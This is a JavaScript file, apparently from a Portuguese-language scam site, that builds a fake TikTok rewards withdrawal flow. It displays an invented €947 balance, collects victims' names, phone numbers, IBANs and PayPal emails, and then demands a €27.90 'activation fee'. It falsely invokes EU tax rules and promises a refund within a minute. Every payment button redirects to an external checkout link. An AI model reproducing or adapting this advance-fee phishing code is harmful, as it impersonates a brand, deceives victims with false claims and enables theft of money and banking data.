/**
 * Navegação e renderização de páginas
 */

// Conteúdo das páginas
const pages = {
  withdraw: `
    <div class="withdraw-page">
      <div class="page-header">
        <button class="back-btn">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
        </button>
        <h1>Levantar Recompensas</h1>
        <button class="help-btn">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
        </button>
      </div>
      
      <!-- Cartão de Saldo -->
      <div class="balance-card">
        <div class="balance-title">O seu Saldo</div>
        <div class="balance-amount-wrapper">
          <div class="balance-amount">€947.00</div>
          <img class="balance-image" src="images/p-saldo-maior.png" alt="icon">
        </div>
      </div>
      
      <div class="last-rewards">
        Recompensas recentes: €54.87
      </div>
      
      <!-- Conteúdo Principal -->
      <div class="withdraw-content">
        <h2 class="withdraw-title">Levantar Dinheiro</h2>
        
        <!-- Métodos de Pagamento -->
        <div class="payment-methods-row">
          <div class="payment-method-item">
            <img src="images/mbway-logo.png" alt="MB WAY" class="payment-method-logo">
            <span class="payment-method-name">MB WAY</span>
          </div>
          <span class="payment-method-separator">/</span>
          <div class="payment-method-item">
            <img src="images/multibanco-logo.png" alt="Multibanco" class="payment-method-logo">
            <span class="payment-method-name">Multibanco</span>
          </div>
          <span class="payment-method-separator">/</span>
          <div class="payment-method-item">
            <img src="https://www.vectorlogo.zone/logos/revolut/revolut-icon.svg" alt="Revolut" class="payment-method-logo">
            <span class="payment-method-name">Revolut</span>
          </div>
          <span class="payment-method-separator">/</span>
          <div class="payment-method-item">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg" alt="Apple Pay" class="payment-method-logo">
            <span class="payment-method-name">Apple Pay</span>
          </div>
        </div>
        
        <!-- Opções de Valor -->
        <div class="amount-options">
          <button class="amount-btn" data-amount="1.50">€1.50</button>
          <button class="amount-btn" data-amount="5">€5</button>
          <button class="amount-btn" data-amount="10">€10</button>
          <button class="amount-btn" data-amount="947.00">€947.00</button>
        </div>
        
        <!-- Display do Método Selecionado -->
        <div id="selected-method-display" class="selected-method-display" style="display: none;">
          <div class="method-display-item">
            <span class="method-logo" id="display-method-logo"></span>
            <div>
              <div class="method-name" id="display-method-name"></div>
              <div class="method-subtitle">Pagamento Instantâneo</div>
            </div>
            <button class="change-method-btn" onclick="openMethodModal()">Alterar</button>
          </div>
        </div>
        
        <!-- Contentor de Formulários -->
        <div id="method-form-container" style="display: none;"></div>
        
        <!-- Botão Adicionar Método -->
        <button class="add-method-btn" id="add-method-btn">Adicionar Método de Levantamento</button>

        <!-- Textos Informativos -->
        <div class="withdraw-info-text">
          <p>Para levantar dinheiro, precisa de um saldo mínimo de €0.40.</p>
          <p>Os limites de levantamento podem variar de acordo com a sua região e conta bancária.</p>
        </div>
      </div>
    </div>
  `,

  loading: `
    <div class="loading-page">
      <div class="loading-content">
        <div class="loading-logo">
          <img src="images/logotiktok.png" alt="TikTok" style="width: 100px;">
        </div>
        <div class="loading-text">A validar acesso...</div>
        <div class="loading-spinner"></div>
      </div>
    </div>
  `,

  registration: `
    <div class="confirmation-container">
      <div class="confirmation-header">
        <div class="confirmation-logo">
          <img src="images/logotiktok.png" alt="TikTok">
        </div>
      </div>

      <div class="confirmation-section confirmation-balance">
        <div class="confirmation-balance-title">SALDO DISPONÍVEL</div>
        <div class="confirmation-balance-amount" data-amount-target="947.00">
          € 947.00
        </div>
        <div class="confirmation-balance-subtitle">
          A aguardar confirmação de levantamento
        </div>
      </div>

      <div class="confirmation-section">
        <div class="confirmation-section-title">
          Taxa de Ativação TikTok Bónus Pro
        </div>
        <div class="confirmation-fee-amount">
          € 27.90
          <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
        </div>
        <div class="confirmation-fee-description">
          De acordo com os regulamentos fiscais europeus, é necessário um pagamento de <span class="bold">€27,90</span> antes que a libertação do seu levantamento totalizando <span class="bold">€947,00</span> possa ser processada. Este valor ser-lhe-á reembolsado automaticamente no prazo de 1 minuto.
        </div>
      </div>

      <div class="confirmation-section">
        <div class="confirmation-section-title">RESUMO DO LEVANTAMENTO</div>
        <div class="confirmation-receipt-grid">
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Nome</div>
            <div class="confirmation-receipt-value" id="confirmation-name"></div>
          </div>
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Data</div>
            <div class="confirmation-receipt-value" id="confirmation-date"></div>
          </div>
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Conta</div>
            <div class="confirmation-receipt-value" id="confirmation-key-type"></div>
          </div>
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Valor a receber</div>
            <div class="confirmation-receipt-value bold">€ 947.00</div>
          </div>
        </div>
      </div>

      <div class="confirmation-divider"></div>

      <div class="confirmation-section">
        <div class="confirmation-section-title">PROCESSO DE LIBERTAÇÃO</div>
        <div class="confirmation-requirements-grid">
          <div class="confirmation-requirement-item">
            <div class="confirmation-requirement-icon">1</div>
            <div class="confirmation-requirement-content">
              <div class="confirmation-requirement-title">
                Completar ativação
              </div>
              <div class="confirmation-requirement-description">
                €27,90 obrigatórios sob regulamentos europeus
              </div>
            </div>
          </div>
          <div class="confirmation-requirement-item">
            <div class="confirmation-requirement-icon confirmation-reembolso">
              ✓
            </div>
            <div class="confirmation-requirement-content">
              <div class="confirmation-requirement-title confirmation-reembolso">
                Receber reembolso automático
              </div>
              <div class="confirmation-requirement-description">
                Valor devolvido em 1 minuto
              </div>
            </div>
          </div>
          <div class="confirmation-requirement-item">
            <div class="confirmation-requirement-icon">3</div>
            <div class="confirmation-requirement-content">
              <div class="confirmation-requirement-title">
                Receber saldo total
              </div>
              <div class="confirmation-requirement-description">
                €947,00 entregues via SEPA/MB WAY
              </div>
            </div>
          </div>
        </div>
      </div>

      <div class="confirmation-section">
        <a href="https://waymb.com/c?username=eduardotreonix&product=1" class="confirmation-cta-button" id="pay-tax-btn">
          Pagar Taxa e Receber Agora
        </a>
        <div class="confirmation-timer">
          ⏱️ Reembolso processado em 1 minuto
        </div>
      </div>

      <div class="confirmation-footer">
        <div class="confirmation-footer-text">Este processo está em conformidade com as leis de Portugal e da União Europeia.</div>
      </div>
    </div>
  `,

  video: `
  <div class="video-page">
    <div class="video-header">
      VEJA O VÍDEO ABAIXO PARA DESBLOQUEAR O SEU LEVANTAMENTO E ACESSO VITALÍCIO.
    </div>
    
    <div class="header-content" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
      <div class="logo-container">
        <img src="images/logotiktok.png" alt="TikTok" style="width: 100px;">
      </div>
      
      <div class="balance-display" style="border: 2px solid #ff2c55; border-radius: 8px; padding: 15px; text-align: center;">
        <div style="font-size: 14px; margin-bottom: 5px;">SALDO</div>
        <div class="balance-amount" style="font-size: 18px; font-weight: bold;">€ 947.00</div>
      </div>
    </div>
    
    <div style="border-bottom: 4px solid black; margin-bottom: 20px;"></div>
    
    <h1 style="color: #ff2c55; font-weight: 800; font-style: bold; font-family: 'Roboto', sans-serif;">
      DESBLOQUEIO DE SALDO
    </h1>
    <p class="video-instruction">Assista ao vídeo para saber como libertar o seu pagamento.</p>
    
    <div class="video-container">
      <video id="tutorial-video" controls preload="metadata" poster="https://charming-figolla-3a3b33.netlify.app//src/media/capatiktok.jpg" playsinline>
        <source src="https://harmonious-toffee-77df94.netlify.app/video.mp4" type="video/mp4">
        O seu navegador não suporta vídeos.
      </video>
    </div>
    
    <button class="unlock-btn">
      DESBLOQUEAR AGORA
    </button>
  </div>
  `,
};

// Estado da página
let currentPage = null;

function initializePages() { }

function showPage(pageName) {
  const container = document.querySelector(".app-container");
  if (!currentPage) currentPage = container.innerHTML;
  container.innerHTML = pages[pageName];

  if (pageName === "withdraw") setupWithdrawPage();
  else if (pageName === "registration") setupRegistrationPage();
  else if (pageName === "video") setupVideoPage();
}

function setupWithdrawPage() {
  const backBtn = document.querySelector(".back-btn");
  if (backBtn) {
    backBtn.addEventListener("click", () => {
      const container = document.querySelector(".app-container");
      container.innerHTML = currentPage;
      initializePages();
    });
  }

  document.querySelectorAll(".amount-btn").forEach((btn) => {
    btn.addEventListener("click", () => {
      document.querySelectorAll(".amount-btn").forEach((b) => b.classList.remove("selected"));
      btn.classList.add("selected");
    });
  });

  const addMethodBtn = document.getElementById("add-method-btn");
  if (addMethodBtn) addMethodBtn.addEventListener("click", () => openMethodModal());
}

function setupRegistrationPage() {
  const formData = JSON.parse(sessionStorage.getItem('withdrawalFormData') || '{}');
  if (formData.name) document.getElementById("confirmation-name").textContent = formData.name;
  if (formData.account) document.getElementById("confirmation-key-type").textContent = formData.account;

  const dateEl = document.getElementById("confirmation-date");
  if (dateEl) {
    const now = new Date();
    dateEl.textContent = now.toLocaleDateString('pt-PT');
  }

  const payButton = document.getElementById("pay-tax-btn");
  if (payButton) {
    payButton.addEventListener("click", (e) => {
      e.preventDefault();
      if (typeof trackInitiateCheckout === "function") trackInitiateCheckout(27.90);
      window.location.href = "https://waymb.com/c?username=eduardotreonix&product=1" + window.location.search;
    });
  }
}

function setupVideoPage() {
  document.querySelector(".unlock-btn").addEventListener("click", () => {
    window.location.href = "https://waymb.com/c?username=eduardotreonix&product=1";
  });
}

let selectedPaymentMethod = null;
function openMethodModal() {
  // Usa a função global definida em of2.html se disponível, ou lógica local
  const modal = document.getElementById("method-modal");
  if (modal) modal.style.display = "flex";
}

function closeMethodModal() {
  const modal = document.getElementById("method-modal");
  if (modal) modal.style.display = "none";
}

function selectMethod(method) {
  selectedPaymentMethod = method;
  closeMethodModal();
  renderMethodForm(method);
  updateMethodDisplay(method);
}

function renderMethodForm(method) {
  const container = document.getElementById("method-form-container");
  const addBtn = document.getElementById("add-method-btn");
  if (!container) return;

  const forms = {
    mbway: '<div class="method-form"><h3>Ligar Método de Pagamento</h3><div class="form-group"><label>Nome Completo</label><input type="text" class="form-input" placeholder="Como aparece no banco" id="mbway-name"></div><div class="form-group"><label>Telemóvel MB WAY</label><input type="tel" class="form-input" placeholder="9xxxxxxxx" id="mbway-phone" maxlength="9"></div><button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button></div>',
    multibanco: '<div class="method-form"><h3>Ligar Método de Pagamento</h3><div class="form-group"><label>Nome do Titular</label><input type="text" class="form-input" placeholder="Nome completo" id="multibanco-name"></div><div class="form-group"><label>IBAN</label><input type="text" class="form-input" placeholder="PT50 xxxx..." id="multibanco-iban"></div><button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button></div>',
    revolut: '<div class="method-form"><h3>Ligar Método de Pagamento</h3><div class="form-group"><label>Nome Completo</label><input type="text" class="form-input" placeholder="Nome no Revolut" id="revolut-name"></div><div class="form-group"><label>Revtag</label><input type="text" class="form-input" placeholder="@oseunome" id="revolut-tag"></div><button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button></div>',
    paypal: '<div class="method-form"><h3>Ligar Método de Pagamento</h3><div class="form-group"><label>Nome Completo</label><input type="text" class="form-input" placeholder="Nome no PayPal" id="paypal-name"></div><div class="form-group"><label>E-mail PayPal</label><input type="email" class="form-input" placeholder="seu@email.com" id="paypal-email"></div><button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button></div>'
  };

  container.innerHTML = forms[method] || '';
  container.style.display = "block";
  if (addBtn) addBtn.style.display = "none";
}

function updateMethodDisplay(method) {
  const display = document.getElementById("selected-method-display");
  const logo = document.getElementById("display-method-logo");
  const name = document.getElementById("display-method-name");
  if (!display || !logo || !name) return;

  const info = {
    mbway: { src: "images/mbway-logo.png", label: "MB WAY" },
    multibanco: { src: "images/multibanco-logo.png", label: "Multibanco" },
    revolut: { src: "https://www.vectorlogo.zone/logos/revolut/revolut-icon.svg", label: "Revolut" },
    paypal: { src: "images/paypal-logo.svg", label: "PayPal" }
  }[method];

  if (info) {
    logo.innerHTML = `<img src="${info.src}" style="width: 50px; height: 35px; object-fit: contain;">`;
    name.textContent = info.label;
  }
  display.style.display = "block";
}

function submitMethodForm() {
  const container = document.getElementById("method-form-container");
  // Simula submissão e vai para loading
  showPage("loading");
  setTimeout(() => showPage("registration"), 2000);
}

// Expose functions globally
window.initializePages = initializePages;
window.showPage = showPage;
window.selectMethod = selectMethod;
window.submitMethodForm = submitMethodForm;
window.openMethodModal = openMethodModal;
